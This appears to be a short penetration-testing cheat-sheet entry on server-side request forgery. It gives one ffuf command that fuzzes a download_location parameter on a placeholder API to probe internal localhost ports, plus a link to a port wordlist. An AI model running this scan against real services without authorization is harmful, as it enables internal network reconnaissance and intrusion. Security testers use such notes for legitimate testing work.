### SSRF 
```
ffuf -w local_ports.txt -u "https://api.example.com/v2/test/test/download/?download_location=http://FUZZ"
```
port wordlist list <a href="https://github.com/a7madn1/Fuzzing/blob/main/localhost-port-fuzzing.txt">localhost-port-fuzzing.txt</a>
